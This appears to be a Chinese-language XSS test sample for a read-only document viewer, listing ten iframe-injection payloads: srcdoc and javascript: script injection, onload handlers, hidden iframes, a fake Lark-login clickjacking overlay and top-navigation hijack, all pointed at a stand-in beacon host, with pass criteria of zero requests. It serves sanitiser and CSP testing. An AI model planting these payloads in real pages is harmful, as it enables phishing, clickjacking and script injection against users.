# XSS 样本 06：iframe 注入

**攻击手法**：`<iframe>` 可以在阅读区里嵌入任意外部页面，用于钓鱼（伪造"登录飞书"表单覆盖在文档上）、点击劫持、以及通过 `srcdoc` 直接注入脚本。对一个"只读查看器"来说，任何 iframe 都不应存在。

**预期：脚本不执行、无外网请求。**

**验证方法**：打开本文件 → 无弹窗 → 阅读区中不出现任何嵌入的外部页面框 → Network 面板中 `xss-beacon.example.invalid` 零请求 → Elements 面板中 `<iframe>` 已被剥离。

---

## payload 1：加载外部页面

<iframe src="https://xss-beacon.example.invalid/06-a.html" width="400" height="120"></iframe>

## payload 2：srcdoc 注入脚本

<iframe srcdoc="<script>alert('XSS-06-B')</script>" width="400" height="60"></iframe>

<iframe srcdoc="&lt;img src=x onerror=alert('XSS-06-C')&gt;" width="400" height="60"></iframe>

## payload 3：javascript 协议

<iframe src="javascript:alert('XSS-06-D')" width="400" height="60"></iframe>

## payload 4：事件属性

<iframe src="about:blank" onload="alert('XSS-06-E')" width="400" height="60"></iframe>

## payload 5：隐藏 iframe（用户看不见，但请求照发）

<iframe src="https://xss-beacon.example.invalid/06-f.html" style="display:none" width="0" height="0"></iframe>

<iframe src="https://xss-beacon.example.invalid/06-g.html" width="1" height="1" frameborder="0"></iframe>

## payload 6：钓鱼覆盖（点击劫持形态）

<div style="position:relative">
  <p>这是一段看起来正常的文档内容。</p>
  <iframe src="https://xss-beacon.example.invalid/fake-lark-login.html"
          style="position:absolute;top:0;left:0;width:100%;height:200px;opacity:0.9;z-index:9999"></iframe>
</div>

## payload 7：sandbox 属性形同虚设（allow-scripts + allow-same-origin）

<iframe src="https://xss-beacon.example.invalid/06-h.html" sandbox="allow-scripts allow-same-origin allow-top-navigation" width="400" height="80"></iframe>

## payload 8：frame / frameset（历史标签）

<frameset><frame src="https://xss-beacon.example.invalid/06-i.html"></frameset>

<frame src="javascript:alert('XSS-06-J')">

## payload 9：portal / fencedframe（新式嵌入元素）

<portal src="https://xss-beacon.example.invalid/06-k.html"></portal>

<fencedframe src="https://xss-beacon.example.invalid/06-l.html"></fencedframe>

## payload 10：顶层导航劫持（即使脚本不执行也是严重缺陷）

<iframe src="https://xss-beacon.example.invalid/06-m.html" onload="top.location='https://xss-beacon.example.invalid/06-n.html'"></iframe>

---

> **判定口径**：阅读区不出现任何 iframe 框体；Network 零请求；应用主窗口 `location` 不变。
> **CSP 兜底**：即便消毒层漏了，Tauri 的严格 CSP（`default-src 'self'`）也应阻断外部 frame 加载——若 Network 里出现请求，说明**两层同时失守**，按 P0 处理。
